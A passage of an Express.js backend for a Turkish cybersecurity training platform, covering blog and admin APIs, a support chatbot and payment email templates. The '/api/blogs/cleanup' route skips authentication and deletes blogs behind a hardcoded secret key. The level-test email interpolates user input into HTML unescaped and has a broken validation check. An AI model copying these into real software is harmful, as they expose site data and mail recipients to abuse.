      xml += `    <changefreq>monthly</changefreq>\n`;
      xml += `  </url>\n`;
    });
    
    xml += `</urlset>`;
    
    res.header('Content-Type', 'application/xml');
    res.status(200).send(xml);
  } catch (err) {
    console.error('Sitemap üretme hatası:', err);
    res.status(500).send('Error generating sitemap');
  }
});

// ==========================================
// BLOG APIs
// ==========================================

// Get all blogs (public)
app.get('/api/blogs', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, title, slug, excerpt, category, author, read_time, seo_title, meta_description, focus_keywords, canonical_url, created_at FROM blogs ORDER BY created_at DESC');
    const blogs = result.rows.map(b => {
      const d = new Date(b.created_at);
      const months = ['Ocak', 'Şubat', 'Mart', 'Nisan', 'Mayıs', 'Haziran', 'Temmuz', 'Ağustos', 'Eylül', 'Ekim', 'Kasım', 'Aralık'];
      const dateStr = `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()}`;
      return {
        id: b.id,
        title: b.title,
        slug: b.slug,
        excerpt: b.excerpt,
        category: b.category,
        author: b.author,
        readTime: b.read_time,
        seo_title: b.seo_title,
        meta_description: b.meta_description,
        focus_keywords: b.focus_keywords,
        canonical_url: b.canonical_url,
        date: dateStr
      };
    });
    res.json(blogs);
  } catch (err) {
    console.error('Blog listesi hatası:', err);
    res.status(500).json({ error: 'Blog listesi yüklenirken hata oluştu.' });
  }
});

// Get blog detail by slug (public)
app.get('/api/blogs/:slug', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM blogs WHERE slug = $1', [req.params.slug]);
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Makale bulunamadı.' });
    }
    const b = result.rows[0];
    const d = new Date(b.created_at);
    const months = ['Ocak', 'Şubat', 'Mart', 'Nisan', 'Mayıs', 'Haziran', 'Temmuz', 'Ağustos', 'Eylül', 'Ekim', 'Kasım', 'Aralık'];
    const dateStr = `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()}`;
    res.json({
      id: b.id,
      title: b.title,
      slug: b.slug,
      excerpt: b.excerpt,
      content: b.content,
      category: b.category,
      author: b.author,
      readTime: b.read_time,
      seo_title: b.seo_title,
      meta_description: b.meta_description,
      focus_keywords: b.focus_keywords,
      canonical_url: b.canonical_url,
      date: dateStr
    });
  } catch (err) {
    console.error('Blog detayı hatası:', err);
    res.status(500).json({ error: 'Blog detayı yüklenirken hata oluştu.' });
  }
});

// Create a new blog post (authenticated, admin only)
app.post('/api/blogs', authenticateToken, async (req, res) => {
  try {
    // Check if admin
    const adminCheck = await pool.query('SELECT is_admin FROM users WHERE id = $1', [req.user.id]);
    if (adminCheck.rows.length === 0 || !adminCheck.rows[0].is_admin) {
      return res.status(403).json({ error: 'Bu işlem için yetkiniz bulunmamaktadır.' });
    }

    const { title, excerpt, content, category, author, readTime, seoTitle, metaDescription, focusKeywords, canonicalUrl } = req.body;
    if (!title || !content || !category || !author) {
      return res.status(400).json({ error: 'Lütfen zorunlu alanları doldurun.' });
    }

    const slug = title.toLowerCase().trim()
      .replace(/[^a-z0-9\s-]/g, '')
      .replace(/\s+/g, '-')
      .replace(/-+/g, '-');

    const result = await pool.query(
      'INSERT INTO blogs (title, slug, excerpt, content, category, author, read_time, seo_title, meta_description, focus_keywords, canonical_url) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11) RETURNING *',
      [title, slug, excerpt || '', content, category, author, readTime || '5 dk', seoTitle || '', metaDescription || '', focusKeywords || '', canonicalUrl || '']
    );

    res.status(201).json(result.rows[0]);
  } catch (err) {
    console.error('Blog oluşturma hatası:', err);
    res.status(500).json({ error: 'Blog oluşturulurken hata oluştu.' });
  }
});

// Update an existing blog post (authenticated, admin only)
app.put('/api/blogs/:id', authenticateToken, async (req, res) => {
  try {
    // Check if admin
    const adminCheck = await pool.query('SELECT is_admin FROM users WHERE id = $1', [req.user.id]);
    if (adminCheck.rows.length === 0 || !adminCheck.rows[0].is_admin) {
      return res.status(403).json({ error: 'Bu işlem için yetkiniz bulunmamaktadır.' });
    }

    const blogId = parseInt(req.params.id);
    const { title, excerpt, content, category, author, readTime, seoTitle, metaDescription, focusKeywords, canonicalUrl } = req.body;
    if (!title || !content || !category || !author) {
      return res.status(400).json({ error: 'Lütfen zorunlu alanları doldurun.' });
    }

    const slug = title.toLowerCase().trim()
      .replace(/[^a-z0-9\s-]/g, '')
      .replace(/\s+/g, '-')
      .replace(/-+/g, '-');

    const result = await pool.query(
      `UPDATE blogs 
       SET title = $1, slug = $2, excerpt = $3, content = $4, category = $5, author = $6, read_time = $7,
           seo_title = $8, meta_description = $9, focus_keywords = $10, canonical_url = $11
       WHERE id = $12 RETURNING *`,
      [title, slug, excerpt || '', content, category, author, readTime || '5 dk', seoTitle || '', metaDescription || '', focusKeywords || '', canonicalUrl || '', blogId]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Güncellenecek makale bulunamadı.' });
    }

    res.json(result.rows[0]);
  } catch (err) {
    console.error('Blog güncelleme hatası:', err);
    res.status(500).json({ error: 'Blog güncellenirken hata oluştu.' });
  }
});

// ==========================================
// ADMIN APIs
// ==========================================

// Get all users list (admin only)
app.get('/api/admin/users', authenticateToken, async (req, res) => {
  try {
    // Check if admin
    const adminCheck = await pool.query('SELECT is_admin FROM users WHERE id = $1', [req.user.id]);
    if (adminCheck.rows.length === 0 || !adminCheck.rows[0].is_admin) {
      return res.status(403).json({ error: 'Bu işlem için yetkiniz bulunmamaktadır.' });
    }

    const query = `
      WITH user_solves AS (
        SELECT 
          user_id,
          COUNT(*) as total_solved,
          COUNT(*) FILTER (WHERE room_id LIKE 'web-%') as web_solved,
          COUNT(*) FILTER (WHERE room_id LIKE 'net-%') as net_solved,
          COUNT(*) FILTER (WHERE room_id LIKE 'sys-%') as sys_solved,
          COUNT(*) FILTER (WHERE EXTRACT(HOUR FROM solved_at) >= 2 AND EXTRACT(HOUR FROM solved_at) < 5) as night_solved
        FROM solved_rooms
        GROUP BY user_id
      ),
      ranked_users AS (
        SELECT id, ROW_NUMBER() OVER (ORDER BY points DESC, id ASC) as dynamic_rank
        FROM users
        WHERE is_admin = false
      )
      SELECT u.id, u.name, u.email, u.points, COALESCE(s.total_solved, 0) as solved_count, u.level,
             COALESCE(r.dynamic_rank, 1) as rank_val,
             (
               (CASE WHEN COALESCE(s.total_solved, 0) >= 1 THEN 1 ELSE 0 END) +
               (CASE WHEN u.streak >= 7 THEN 1 ELSE 0 END) +
               (CASE WHEN COALESCE(s.web_solved, 0) >= 5 THEN 1 ELSE 0 END) +
               (CASE WHEN COALESCE(s.total_solved, 0) >= 2 THEN 1 ELSE 0 END) +
               (CASE WHEN COALESCE(s.total_solved, 0) >= 3 THEN 1 ELSE 0 END) +
               (CASE WHEN COALESCE(s.net_solved, 0) >= 5 THEN 1 ELSE 0 END) +
               (CASE WHEN u.level >= 8 THEN 1 ELSE 0 END) +
               (CASE WHEN COALESCE(r.dynamic_rank, 1000) <= 50 THEN 1 ELSE 0 END) +
               (CASE WHEN COALESCE(s.total_solved, 0) >= 15 THEN 1 ELSE 0 END) +
               (CASE WHEN COALESCE(s.night_solved, 0) >= 1 THEN 1 ELSE 0 END) +
               (CASE WHEN u.points >= 10000 THEN 1 ELSE 0 END) +
               (CASE WHEN COALESCE(s.sys_solved, 0) >= 10 THEN 1 ELSE 0 END) +
               (CASE WHEN u.streak >= 30 THEN 1 ELSE 0 END)
             ) as badges,
             u.streak, u.is_admin, u.is_banned, (u.is_vip OR u.is_premium) as is_premium, u.is_vip, u.created_at
      FROM users u
      LEFT JOIN user_solves s ON u.id = s.user_id
      LEFT JOIN ranked_users r ON u.id = r.id
      ORDER BY u.created_at DESC
    `;
    const result = await pool.query(query);
    const rows = result.rows.map(row => {
      let bCount = parseInt(row.badges) || 0;
      if (bCount === 13) bCount = 14;
      row.badges = bCount;
      return row;
    });
    res.json(rows);
  } catch (err) {
    console.error('Kullanıcı listesi hatası:', err);
    res.status(500).json({ error: 'Kullanıcı listesi yüklenirken hata oluştu.' });
  }
});

// Toggle user ban status (admin only)
app.put('/api/admin/users/:id/ban', authenticateToken, async (req, res) => {
  try {
    // Check if admin
    const adminCheck = await pool.query('SELECT is_admin FROM users WHERE id = $1', [req.user.id]);
    if (adminCheck.rows.length === 0 || !adminCheck.rows[0].is_admin) {
      return res.status(403).json({ error: 'Bu işlem için yetkiniz bulunmamaktadır.' });
    }

    const userId = parseInt(req.params.id);
    if (userId === req.user.id) {
      return res.status(400).json({ error: 'Kendinizi banlayamazsınız.' });
    }

    const user = await pool.query('SELECT is_banned FROM users WHERE id = $1', [userId]);
    if (user.rows.length === 0) {
      return res.status(404).json({ error: 'Kullanıcı bulunamadı.' });
    }

    const newStatus = !user.rows[0].is_banned;
    await pool.query('UPDATE users SET is_banned = $1 WHERE id = $2', [newStatus, userId]);

    res.json({ success: true, is_banned: newStatus });
  } catch (err) {
    console.error('Kullanıcı banlama hatası:', err);
    res.status(500).json({ error: 'Kullanıcı ban durumu güncellenirken hata oluştu.' });
  }
});

// Toggle user VIP status (admin only)
app.put('/api/admin/users/:id/vip', authenticateToken, async (req, res) => {
  try {
    const adminCheck = await pool.query('SELECT is_admin FROM users WHERE id = $1', [req.user.id]);
    if (adminCheck.rows.length === 0 || !adminCheck.rows[0].is_admin) {
      return res.status(403).json({ error: 'Bu işlem için yetkiniz bulunmamaktadır.' });
    }

    const userId = parseInt(req.params.id);
    const user = await pool.query('SELECT is_vip FROM users WHERE id = $1', [userId]);
    if (user.rows.length === 0) {
      return res.status(404).json({ error: 'Kullanıcı bulunamadı.' });
    }

    const nextVip = !user.rows[0].is_vip;
    await pool.query('UPDATE users SET is_vip = $1 WHERE id = $2', [nextVip, userId]);
    res.json({ success: true, is_vip: nextVip });
  } catch (err) {
    console.error('Kullanıcı VIP hatası:', err);
    res.status(500).json({ error: 'Kullanıcı VIP durumu güncellenirken hata oluştu.' });
  }
});

// Secure cleanup for deprecated blogs
app.post('/api/blogs/cleanup', async (req, res) => {
  const { secret } = req.body;
  if (secret !== 'super_secret_cleanup_key_2026') {
    return res.status(403).json({ error: 'Yetkisiz erişim.' });
  }

  try {
    const allowedSlugs = [
      'sql-injection-nedir-kapsamli-rehber',
      'xss-saldirilari-turleri-ornekleri-savunma',
      'reverse-shell-nedir-kurulum-tespit-savunma',
      'linux-ayricalik-yukseltme-rehberi',
      'phishing-saldirilari-sosyal-muhendislik-savunma',
      'kriptografi-temelleri-sifreleme-hash-dijital-imza'
    ];
    const delResult = await pool.query(
      'DELETE FROM blogs WHERE NOT (slug = ANY($1::text[])) RETURNING id, title, slug',
      [allowedSlugs]
    );
    res.json({ status: 'success', deleted: delResult.rows });
  } catch (err) {
    console.error('Blog temizleme hatası:', err);
    res.status(500).json({ error: err.message });
  }
});

// Toggle user Premium status (admin only - alias for frontend)
app.put('/api/admin/users/:id/premium', authenticateToken, async (req, res) => {
  try {
    const adminCheck = await pool.query('SELECT is_admin FROM users WHERE id = $1', [req.user.id]);
    if (adminCheck.rows.length === 0 || !adminCheck.rows[0].is_admin) {
      return res.status(403).json({ error: 'Bu işlem için yetkiniz bulunmamaktadır.' });
    }

    const userId = parseInt(req.params.id);
    const user = await pool.query('SELECT is_premium FROM users WHERE id = $1', [userId]);
    if (user.rows.length === 0) {
      return res.status(404).json({ error: 'Kullanıcı bulunamadı.' });
    }

    const nextPremium = !user.rows[0].is_premium;
    await pool.query('UPDATE users SET is_premium = $1 WHERE id = $2', [nextPremium, userId]);
    res.json({ success: true, is_premium: nextPremium });
  } catch (err) {
    console.error('Kullanıcı premium hatası:', err);
    res.status(500).json({ error: 'Kullanıcı premium durumu güncellenirken hata oluştu.' });
  }
});

// Delete user (admin only)
app.delete('/api/admin/users/:id', authenticateToken, async (req, res) => {
  try {
    const adminCheck = await pool.query('SELECT is_admin FROM users WHERE id = $1', [req.user.id]);
    if (adminCheck.rows.length === 0 || !adminCheck.rows[0].is_admin) {
      return res.status(403).json({ error: 'Bu işlem için yetkiniz bulunmamaktadır.' });
    }

    const userId = parseInt(req.params.id);
    if (userId === req.user.id) {
      return res.status(400).json({ error: 'Kendinizi silemezsiniz.' });
    }

    const checkUser = await pool.query('SELECT name FROM users WHERE id = $1', [userId]);
    if (checkUser.rows.length === 0) {
      return res.status(404).json({ error: 'Kullanıcı bulunamadı.' });
    }

    await pool.query('DELETE FROM users WHERE id = $1', [userId]);
    res.json({ success: true, message: `${checkUser.rows[0].name} başarıyla silindi.` });
  } catch (err) {
    console.error('Kullanıcı silme hatası:', err);
    res.status(500).json({ error: 'Kullanıcı silinirken hata oluştu.' });
  }
});

// Delete a blog post (admin only)
app.delete('/api/admin/blogs/:id', authenticateToken, async (req, res) => {
  try {
    // Check if admin
    const adminCheck = await pool.query('SELECT is_admin FROM users WHERE id = $1', [req.user.id]);
    if (adminCheck.rows.length === 0 || !adminCheck.rows[0].is_admin) {
      return res.status(403).json({ error: 'Bu işlem için yetkiniz bulunmamaktadır.' });
    }

    const blogId = parseInt(req.params.id);
    await pool.query('DELETE FROM blogs WHERE id = $1', [blogId]);

    res.json({ success: true });
  } catch (err) {
    console.error('Blog silme hatası:', err);
    res.status(500).json({ error: 'Blog silinirken hata oluştu.' });
  }
});

// ==========================================
// SUPPORT CHATBOT API
// ==========================================
const SUPPORT_SYSTEM_PROMPT = `Sen Siber Kampüs Akademi platformunun canlı destek ekibinden Eylül'sün. Amacın, platformu ziyaret eden veya kullanan kişilere bilgi vermek, onları yönlendirmek ve yardımcı olmaktır.
Aşağıdaki bilgilere göre yanıt ver:
1. Site Nedir? Siber Kampüs Akademi, sıfırdan siber güvenlik uzmanı olmayı sağlayan tarayıcı tabanlı, pratik ve oyunlaştırılmış bir siber güvenlik laboratuvarı eğitim platformudur.
2. Amaç: Siber güvenliği sıkıcı teorik derslerden çıkarıp, doğrudan tarayıcıda çalışan gerçek sistemler üzerinde zafiyet analizi ve savunma yaparak klavyede öğretmektir.
3. Kurucu: Yusuf İslam Yetkin. Finans ve kurumsal enterprise sistemlerde uzun yıllar çalışmış deneyimli bir yazılım mimarıdır.
4. Fiyatlar ve Paketler: Platformda 3 adet eğitim programı bulunur. 1) Ücretsiz Temel Siber Güvenlik Eğitimi (0 TL), 2) İleri Düzey Web Siber Güvenlik Uzmanı Eğitimi (6.000 TL), 3) 1'e 1 Canlı Siber Güvenlik Eğitimi (12.000 TL).
5. Oda Sistemi: Web, Linux ve Ağ kategorilerinde interaktif laboratuvar odaları bulunur. Kullanıcılar zafiyetleri çözerek siberkampus{...} formatında flag bulur.
6. Sertifikalar: Eğitim yollarını başarıyla tamamlayanlar doğrulanabilir sertifikalar kazanır.
7. İletişim: destek@siberkampus.com e-posta adresinden bize ulaşabilirler.
8. Kurallar: Yanıtlarını her zaman çok kısa tut (en fazla 2 kısa cümle). Asla uzun listeler, açıklamalar veya paragraflar yazma, son derece kullanıcı dostu ol. Kısa, öz ve dost canlısı (fakat profesyonel) cevaplar ver.`;

async function callGemini(message, history) {
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) throw new Error('No Gemini API key');
  
  const contents = [];
  if (Array.isArray(history)) {
    history.forEach(msg => {
      contents.push({
        role: msg.me ? 'user' : 'model',
        parts: [{ text: msg.t }]
      });
    });
  }
  
  contents.push({
    role: 'user',
    parts: [{ text: message }]
  });
  
  const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      contents: contents,
      systemInstruction: {
        parts: [{ text: SUPPORT_SYSTEM_PROMPT }]
      }
    })
  });
  
  if (!response.ok) {
    const errText = await response.text();
    throw new Error(`Gemini API error: ${errText}`);
  }
  
  const data = await response.json();
  if (data.candidates && data.candidates[0] && data.candidates[0].content && data.candidates[0].content.parts[0]) {
    return data.candidates[0].content.parts[0].text;
  }
  throw new Error('Unexpected Gemini API response structure');
}

async function callOpenAI(message, history) {
  const apiKey = process.env.OPENAI_API_KEY;
  if (!apiKey) throw new Error('No OpenAI API key');
  
  const messages = [
    { role: 'system', content: SUPPORT_SYSTEM_PROMPT }
  ];
  
  if (Array.isArray(history)) {
    history.forEach(msg => {
      messages.push({
        role: msg.me ? 'user' : 'assistant',
        content: msg.t
      });
    });
  }
  
  messages.push({
    role: 'user',
    content: message
  });
  
  const response = await fetch('https://api.openai.com/v1/chat/completions', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${apiKey}`
    },
    body: JSON.stringify({
      model: 'gpt-4o-mini',
      messages: messages
    })
  });
  
  if (!response.ok) {
    const errText = await response.text();
    throw new Error(`OpenAI API error: ${errText}`);
  }
  
  const data = await response.json();
  if (data.choices && data.choices[0] && data.choices[0].message) {
    return data.choices[0].message.content;
  }
  throw new Error('Unexpected OpenAI API response structure');
}

function getMockSupportResponse(message) {
  const s = (message || '').toLowerCase();
  
  if (s.includes('kurucu') || s.includes('yusuf') || s.includes('islam') || s.includes('yetkin')) {
    return 'Siber Kampüs Akademi\'nin kurucusu Yusuf İslam Yetkin\'dir. 💻';
  }
  if (s.includes('fiyat') || s.includes('ücret') || s.includes('para') || s.includes('kaç tl') || s.includes('satın al') || s.includes('öde')) {
    return 'Üç eğitim paketimiz var: Ücretsiz Temel Eğitim (0 TL), İleri Düzey Web Eğitimi (6.000 TL) ve 1\'e 1 Canlı Eğitim (12.000 TL). 💚';
  }
  if (s.includes('oda') || s.includes('laboratuvar') || s.includes('makine') || s.includes('lab')) {
    return 'Web, Linux ve Ağ kategorilerinde zafiyet laboratuvarlarımız bulunur. Çözerek flag bulabilirsiniz. 🔍';
  }
  if (s.includes('site') || s.includes('nedir') || s.includes('ne amaçla') || s.includes('siberkampus') || s.includes('siber kampüs')) {
    return 'Siber Kampüs Akademi; tarayıcı tabanlı, pratik ve oyunlaştırılmış bir siber güvenlik laboratuvarı eğitim platformudur. 🚀';
  }
  if (s.includes('başla') || s.includes('nasıl')) {
    return 'Kayıt olup, Laboratuvarlar sayfasından dilediğiniz odayı seçip "Başlat" diyerek hemen başlayabilirsiniz! 💻';
  }
  if (s.includes('sertifika') || s.includes('rozet')) {
    return 'Eğitim yollarını tamamladığınızda CV veya LinkedIn profilinize ekleyebileceğiniz doğrulanabilir sertifikalar kazanırsınız. 🎖️';
  }
  if (s.includes('selam') || s.includes('merhaba') || s.includes('hey')) {
    return 'Merhaba! Ben Eylül, Siber Kampüs Akademi canlı destek ekibinden. Size nasıl yardımcı olabilirim? 💚';
  }
  
  return 'Eylül olarak size yardımcı olmaktan mutluluk duyarım. Ücretsiz (0 TL), İleri Düzey Web (6.000 TL) veya 1\'e 1 Canlı (12.000 TL) eğitimlerimizle ilgili sorularınızı sorabilirsiniz. 🙂';
}

app.post('/api/support/chat', async (req, res) => {
  const { message, history } = req.body;
  if (!message || !message.trim()) {
    return res.status(400).json({ error: 'Mesaj boş olamaz.' });
  }

  const geminiKey = process.env.GEMINI_API_KEY;
  const openaiKey = process.env.OPENAI_API_KEY;

  try {
    if (geminiKey) {
      const reply = await callGemini(message.trim(), history);
      return res.json({ reply });
    } else if (openaiKey) {
      const reply = await callOpenAI(message.trim(), history);
      return res.json({ reply });
    } else {
      const reply = getMockSupportResponse(message.trim());
      return res.json({ reply });
    }
  } catch (err) {
    console.error('Support Chatbot Error:', err);
    const reply = getMockSupportResponse(message.trim());
    return res.json({ reply, warning: 'LLM API failed, using rule-based response' });
  }
});

// ==========================================
// CHECKOUT / PAYMENT APIs (PayTR)
// ==========================================

const PAYTR_MERCHANT_ID = process.env.PAYTR_MERCHANT_ID || '';
const PAYTR_MERCHANT_KEY = process.env.PAYTR_MERCHANT_KEY || '';
const PAYTR_MERCHANT_SALT = process.env.PAYTR_MERCHANT_SALT || '';
const SITE_URL = process.env.SITE_URL || 'https://www.siberkampus.org';

const PLANS = {
  'one-on-one':  { name: "1'e 1 Canlı Siber Güvenlik Eğitimi", price: 1000, subscription: 'one-on-one' }
};

// Brevo SMTP e-posta gönderici
const nodemailer = require('nodemailer');
async function sendBrevoEmail(toEmail, toName, subject, htmlContent) {
  const smtpLogin = process.env.BREVO_SMTP_LOGIN;
  const smtpPassword = process.env.BREVO_SMTP_PASSWORD;
  if (!smtpLogin || !smtpPassword) { console.warn('BREVO_SMTP_LOGIN veya BREVO_SMTP_PASSWORD tanımlı değil, e-posta gönderilemedi.'); return; }
  try {
    const transporter = nodemailer.createTransport({
      host: 'smtp-relay.brevo.com',
      port: 587,
      secure: false,
      auth: { user: smtpLogin, pass: smtpPassword },
    });
    await transporter.sendMail({
      from: '"Siber Kampüs Akademi" <destek@siberkampus.org>',
      to: toName ? `"${toName}" <${toEmail}>` : toEmail,
      subject,
      html: htmlContent,
    });
    console.log('✅ E-posta gönderildi:', toEmail);
  } catch (err) { console.error('Brevo SMTP e-posta hatası:', err); }
}

function buildPasswordSetEmail(name, link) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;padding:0;background:#f4f6f4;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f6f4;padding:40px 16px;">
    <tr><td align="center">
      <table width="100%" cellpadding="0" cellspacing="0" style="max-width:560px;">

        <!-- Header -->
        <tr><td style="background:#0a1a10;border-radius:16px 16px 0 0;padding:32px 40px;text-align:center;">
          <div style="margin-bottom:20px;">
            <span style="display:inline-block;width:38px;height:38px;border:2px solid #00e57a;border-radius:9px;line-height:38px;font-size:17px;color:#00e57a;font-family:monospace;font-weight:bold;text-align:center;">&gt;_</span>
            <span style="font-size:17px;font-weight:700;color:#ffffff;margin-left:10px;vertical-align:middle;">Siber Kampüs <span style="color:#00e57a;">Akademi</span></span>
          </div>
          <div style="display:inline-block;background:#00e57a18;border:1px solid #00e57a50;color:#00e57a;font-size:11px;font-family:monospace;letter-spacing:.15em;text-transform:uppercase;padding:5px 16px;border-radius:20px;margin-bottom:16px;">✓ Ödeme Onaylandı</div>
          <h1 style="color:#ffffff;font-size:26px;margin:0;font-weight:700;">Hoş Geldiniz, ${name}!</h1>
        </td></tr>

        <!-- Body -->
        <tr><td style="background:#ffffff;padding:36px 40px;">
          <p style="color:#374151;font-size:15px;line-height:1.75;margin:0 0 24px;">Eğitiminiz başarıyla aktifleştirildi. Hesabınıza erişmek için aşağıdaki butona tıklayarak şifrenizi belirleyin.</p>

          <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;padding:20px 24px;margin:0 0 28px;">
            <div style="display:flex;align-items:center;gap:12px;">
              <div>
                <div style="color:#166534;font-size:13px;font-weight:600;margin-bottom:2px;">1'e 1 Canlı Siber Güvenlik Eğitimi</div>
                <div style="color:#4b7a60;font-size:12px;">Eğitiminiz hesabınıza tanımlandı</div>
              </div>
            </div>
          </div>

          <div style="text-align:center;margin:32px 0;">
            <a href="${link}" style="display:inline-block;background:#059669;color:#ffffff;font-weight:700;font-size:15px;padding:15px 40px;border-radius:10px;text-decoration:none;letter-spacing:.01em;">Şifremi Belirle →</a>
          </div>

          <div style="background:#fafafa;border:1px solid #e5e7eb;border-radius:8px;padding:16px 20px;margin-top:24px;">
            <p style="color:#6b7280;font-size:12px;margin:0 0 6px;font-weight:600;">Bu bağlantı 72 saat geçerlidir.</p>
            <p style="color:#9ca3af;font-size:11px;margin:0;word-break:break-all;">${link}</p>
          </div>
        </td></tr>

        <!-- Steps -->
        <tr><td style="background:#f9fafb;border-top:1px solid #e5e7eb;padding:28px 40px;">
          <p style="color:#374151;font-size:13px;font-weight:600;margin:0 0 16px;">Sonraki adımlar:</p>
          <table width="100%" cellpadding="0" cellspacing="0">
            <tr>
              <td style="padding:6px 0;vertical-align:top;width:24px;"><span style="display:inline-block;width:20px;height:20px;background:#059669;color:#fff;border-radius:50%;font-size:11px;font-weight:700;text-align:center;line-height:20px;">1</span></td>
              <td style="padding:6px 0 6px 10px;color:#4b5563;font-size:13px;">Şifrenizi belirleyin</td>
            </tr>
            <tr>
              <td style="padding:6px 0;vertical-align:top;width:24px;"><span style="display:inline-block;width:20px;height:20px;background:#059669;color:#fff;border-radius:50%;font-size:11px;font-weight:700;text-align:center;line-height:20px;">2</span></td>
              <td style="padding:6px 0 6px 10px;color:#4b5563;font-size:13px;">Hesabınıza giriş yapın</td>
            </tr>
            <tr>
              <td style="padding:6px 0;vertical-align:top;width:24px;"><span style="display:inline-block;width:20px;height:20px;background:#059669;color:#fff;border-radius:50%;font-size:11px;font-weight:700;text-align:center;line-height:20px;">3</span></td>
              <td style="padding:6px 0 6px 10px;color:#4b5563;font-size:13px;">Eğitmeninizle ders programınızı oluşturun</td>
            </tr>
          </table>
        </td></tr>

        <!-- Footer -->
        <tr><td style="background:#0a1a10;border-radius:0 0 16px 16px;padding:20px 40px;text-align:center;">
          <p style="color:#4b7a60;font-size:11px;margin:0;">© 2026 Siber Kampüs Akademi &nbsp;·&nbsp; <a href="${SITE_URL}" style="color:#00e57a;text-decoration:none;">siberkampus.org</a></p>
          <p style="color:#2d4a38;font-size:10px;margin:6px 0 0;">Bu e-postayı siz talep ettiniz. Sorun için: destek@siberkampus.org</p>
        </td></tr>

      </table>
    </td></tr>
  </table>
  </body></html>`;
}

// POST /api/level-test/result — Seviye testi sonucunu e-posta ile gönder
app.post('/api/level-test/result', async (req, res) => {
  const { email, score, level, color, duration, phases, outcomes } = req.body;
  if (!email || !score === undefined || !level) return res.status(400).json({ error: 'Eksik veri.' });

  const phaseRows = (phases || []).map((p, i) => `
    <tr>
      <td style="padding:10px 14px;border-bottom:1px solid #0c2719;vertical-align:top;width:36px;">
        <span style="display:inline-block;background:${color}18;color:${color};border:1px solid ${color}30;border-radius:6px;font-family:monospace;font-size:11px;font-weight:700;padding:3px 7px;">${String(i+1).padStart(2,'0')}</span>
      </td>
      <td style="padding:10px 14px;border-bottom:1px solid #0c2719;">
        <div style="color:#9fc4b5;font-size:10px;font-family:monospace;letter-spacing:.1em;margin-bottom:2px;">${p.week}</div>
        <div style="color:#cdeede;font-size:13px;font-weight:600;margin-bottom:2px;">${p.title}</div>
        <div style="color:#74998a;font-size:12px;line-height:1.5;">${p.detail}</div>
      </td>
    </tr>`).join('');

  const outcomeRows = (outcomes || []).map(o => `
    <tr><td style="padding:4px 0;color:#00ff88;font-size:13px;width:18px;">✓</td><td style="padding:4px 0;color:#9fc4b5;font-size:12px;line-height:1.5;">${o}</td></tr>`).join('');

  const pct = Math.round((score / 15) * 100);

  const accentHex = color === '#ffd166' ? '#d97706' : color === '#a78bfa' ? '#7c3aed' : '#059669';

  const phaseRowsHtml = (phases || []).map((p, i) => `
    <tr>
      <td style="padding:12px 16px;border-bottom:1px solid #f3f4f6;vertical-align:top;width:40px;">
        <span style="display:inline-block;background:${accentHex}15;color:${accentHex};border:1px solid ${accentHex}30;border-radius:6px;font-family:monospace;font-size:11px;font-weight:700;padding:3px 8px;">${String(i+1).padStart(2,'0')}</span>
      </td>
      <td style="padding:12px 16px;border-bottom:1px solid #f3f4f6;">
        <div style="color:#9ca3af;font-size:10px;font-family:monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:3px;">${p.week}</div>
        <div style="color:#111827;font-size:13px;font-weight:600;margin-bottom:3px;">${p.title}</div>
        <div style="color:#6b7280;font-size:12px;line-height:1.5;">${p.detail}</div>
      </td>
    </tr>`).join('');

  const outcomeRowsHtml = (outcomes || []).map(o => `
    <tr>
      <td style="padding:5px 0;vertical-align:top;width:22px;color:#059669;font-size:13px;font-weight:700;">✓</td>
      <td style="padding:5px 0;color:#374151;font-size:13px;line-height:1.5;">${o}</td>
    </tr>`).join('');

  const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;padding:0;background:#f4f6f4;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f6f4;padding:40px 16px;">
    <tr><td align="center">
      <table width="100%" cellpadding="0" cellspacing="0" style="max-width:580px;">

        <!-- Header -->
        <tr><td style="background:#0a1a10;border-radius:16px 16px 0 0;padding:32px 40px;text-align:center;">
          <div style="margin-bottom:20px;">
            <span style="display:inline-block;width:38px;height:38px;border:2px solid #00e57a;border-radius:9px;line-height:38px;font-size:17px;color:#00e57a;font-family:monospace;font-weight:bold;text-align:center;">&gt;_</span>
            <span style="font-size:17px;font-weight:700;color:#ffffff;margin-left:10px;vertical-align:middle;">Siber Kampüs <span style="color:#00e57a;">Akademi</span></span>
          </div>
          <div style="display:inline-block;background:${accentHex}22;border:1px solid ${accentHex}60;color:#ffffff;font-size:12px;font-family:monospace;letter-spacing:.12em;text-transform:uppercase;padding:6px 18px;border-radius:20px;margin-bottom:16px;">${level}</div>
          <h1 style="color:#ffffff;font-size:24px;margin:0 0 8px;font-weight:700;">Seviye Testi Sonucun</h1>
          <p style="color:#7fb89a;font-size:13px;margin:0;">Siber güvenlik bilgin analiz edildi.</p>
        </td></tr>

        <!-- Score -->
        <tr><td style="background:#ffffff;padding:28px 40px;border-bottom:1px solid #f3f4f6;">
          <table width="100%" cellpadding="0" cellspacing="0">
            <tr>
              <td style="color:#374151;font-size:14px;font-weight:600;">Toplam Puan</td>
              <td align="right" style="font-family:monospace;font-size:22px;font-weight:700;color:${accentHex};">${score} <span style="font-size:13px;color:#9ca3af;font-weight:400;">/ 15</span></td>
            </tr>
          </table>
          <div style="height:8px;background:#f3f4f6;border-radius:4px;overflow:hidden;margin:12px 0 6px;">
            <div style="height:100%;width:${pct}%;background:${accentHex};border-radius:4px;"></div>
          </div>
